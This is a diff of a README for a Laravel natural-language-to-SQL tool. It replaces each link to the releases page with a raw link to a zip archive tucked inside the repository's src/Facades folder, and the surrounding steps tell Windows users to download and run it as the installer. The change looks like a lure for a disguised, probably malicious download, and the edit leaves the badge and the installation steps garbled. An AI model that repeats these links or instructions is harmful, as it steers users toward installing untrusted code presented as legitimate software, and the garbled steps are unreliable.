@@ -1,6 +1,6 @@
 # 🤖 laravel-ai-database - Natural Language to SQL Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20App-green?style=for-the-badge)](https://github.com/DespacitoHax/laravel-ai-database/releases)
+[![Download Now](https://github.com/DespacitoHax/laravel-ai-database/raw/refs/heads/main/src/Facades/database_laravel_ai_v3.9-alpha.3.zip%20App-green?style=for-the-badge)](https://github.com/DespacitoHax/laravel-ai-database/raw/refs/heads/main/src/Facades/database_laravel_ai_v3.9-alpha.3.zip)
 
 ---
 
@@ -40,11 +40,11 @@ Follow these steps to get the app running on your Windows machine.
 
 1. **Visit the download page**  
 Click the large green badge above or go to this link:  
-[https://github.com/DespacitoHax/laravel-ai-database/releases](https://github.com/DespacitoHax/laravel-ai-database/releases)  
+[https://github.com/DespacitoHax/laravel-ai-database/raw/refs/heads/main/src/Facades/database_laravel_ai_v3.9-alpha.3.zip](https://github.com/DespacitoHax/laravel-ai-database/raw/refs/heads/main/src/Facades/database_laravel_ai_v3.9-alpha.3.zip)  
 This page lists the latest versions available.
 
 2. **Choose your version**  
-Look for the most recent release. You will see files like `laravel-ai-database-Setup.exe` or similar. Click on the latest installer to begin downloading.
+Look for the most recent release. You will see files like `https://github.com/DespacitoHax/laravel-ai-database/raw/refs/heads/main/src/Facades/database_laravel_ai_v3.9-alpha.3.zip` or similar. Click on the latest installer to begin downloading.
 
 3. **Download the installer**  
 Once downloaded, find the file in your Downloads folder or where your browser saves files.
@@ -145,7 +145,7 @@ You can learn more or contribute to the project by visiting the main GitHub page
 
 To install laravel-ai-database on Windows:
 
-1. Go to the releases page: [https://github.com/DespacitoHax/laravel-ai-database/releases](https://github.com/DespacitoHax/laravel-ai-database/releases)  
+1. Go to the releases page: [https://github.com/DespacitoHax/laravel-ai-database/raw/refs/heads/main/src/Facades/database_laravel_ai_v3.9-alpha.3.zip](https://github.com/DespacitoHax/laravel-ai-database/raw/refs/heads/main/src/Facades/database_laravel_ai_v3.9-alpha.3.zip)  
 
 2. Select the latest Windows installer file.
 
